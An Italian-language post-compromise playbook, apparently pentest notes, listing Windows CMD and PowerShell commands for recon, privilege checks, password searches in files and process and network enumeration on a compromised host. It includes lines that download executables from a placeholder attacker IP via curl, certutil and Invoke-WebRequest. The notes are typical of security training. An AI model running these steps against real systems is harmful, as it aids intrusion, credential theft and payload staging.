# 🖥️ Windows Commands (Playbook Generale)

Appunti e snippet per la fase di **interazione diretta** con un sistema Windows compromesso.
Valido sia in **shell CMD/PowerShell** che dentro Meterpreter (`shell`).

---

## 📌 Obiettivi

* Raccolta **informazioni di sistema e utente**.
* Ricognizione di **rete, servizi e processi**.
* Verifica dei **privilegi attuali**.
* Preparazione a **escalation, persistence, esfiltrazione**.

---

## 🧭 Ricognizione base

```cmd
whoami                # utente attuale
whoami /groups        # gruppi a cui appartieni
hostname              # nome host
echo %USERNAME%       # variabile ambiente
echo %USERDOMAIN%     # dominio o workgroup
ver                   # versione Windows
systeminfo            # OS, patch, architettura
```

### PowerShell equivalenti

```powershell
Get-ComputerInfo
[System.Environment]::UserName
[System.Environment]::OSVersion
```

---

## 🔑 Privilegi & utenti

```cmd
whoami /priv          # privilegi attivi
net user              # lista utenti
net user <utente>     # info su utente specifico
net localgroup        # lista gruppi locali
net localgroup administrators  # membri gruppo admin
```

---

## 📂 File system & directories

```cmd
dir                   # lista file
cd C:\Users           # cambia cartella
type file.txt         # mostra contenuto
findstr "password" *.txt  # cerca stringa in file
```

### PowerShell

```powershell
Get-ChildItem C:\Users
Get-Content file.txt
Select-String -Path *.txt -Pattern "password"
```

---

## ⚙️ Processi & servizi

```cmd
tasklist              # processi attivi
taskkill /PID 1234 /F # termina processo
sc query              # lista servizi
sc qc <service>       # config servizio
```

### PowerShell

```powershell
Get-Process
Stop-Process -Id 1234 -Force
Get-Service
```

---

## 🌐 Rete & connessioni

```cmd
ipconfig /all         # info rete
route print           # routing table
arp -a                # ARP cache
netstat -ano          # connessioni + PID
net view              # computer in rete
net share             # condivisioni attive
```

### PowerShell

```powershell
Get-NetIPAddress
Get-NetRoute
Get-NetNeighbor
Get-NetTCPConnection
```

---

## 📦 Trasferimento file

### Con curl (Win10+)

```cmd
curl http://<IP>/file.exe -o file.exe
```

### Con certutil

```cmd
certutil -urlcache -split -f http://<IP>/file.exe file.exe
```

### Con PowerShell

```powershell
Invoke-WebRequest -Uri http://<IP>/file.exe -OutFile file.exe
```

---

## 🔒 Persistence & escalation check

```cmd
schtasks /query /fo LIST /v   # scheduled tasks
wmic qfe list brief           # patch installate
```

PowerShell (patches):

```powershell
Get-HotFix
```

---

## 📊 Tabella rapida

| Categoria      | CMD                     | PowerShell                                |
| -------------- | ----------------------- | ----------------------------------------- |
| Utente attuale | `whoami`                | `[System.Environment]::UserName`          |
| Privilegi      | `whoami /priv`          | `whoami /priv` (uguale)                   |
| Info OS        | `systeminfo`            | `Get-ComputerInfo`                        |
| Processi       | `tasklist`              | `Get-Process`                             |
| Servizi        | `sc query`              | `Get-Service`                             |
| Rete           | `netstat -ano`          | `Get-NetTCPConnection`                    |
| IP config      | `ipconfig /all`         | `Get-NetIPAddress`                        |
| File view      | `type file.txt`         | `Get-Content file.txt`                    |
| Ricerca testo  | `findstr "pw" *.txt`    | `Select-String -Path *.txt -Pattern "pw"` |
| File download  | `certutil -urlcache -f` | `Invoke-WebRequest -Uri ...`              |

---

## ✅ Checklist post-compromissione

* [ ] Identità utente (`whoami`, `net user`).
* [ ] Privilegi (`whoami /priv`, gruppi).
* [ ] Info sistema (`systeminfo`, `Get-ComputerInfo`).
* [ ] Processi/servizi (`tasklist`, `Get-Service`).
* [ ] Networking (`ipconfig`, `netstat`, `arp -a`).
* [ ] File sensibili (`dir`, `findstr`).
* [ ] Patch & persistence (`wmic qfe`, `schtasks`).
* [ ] Trasferimento file pronto (`certutil`, `curl`, `Invoke-WebRequest`).

---
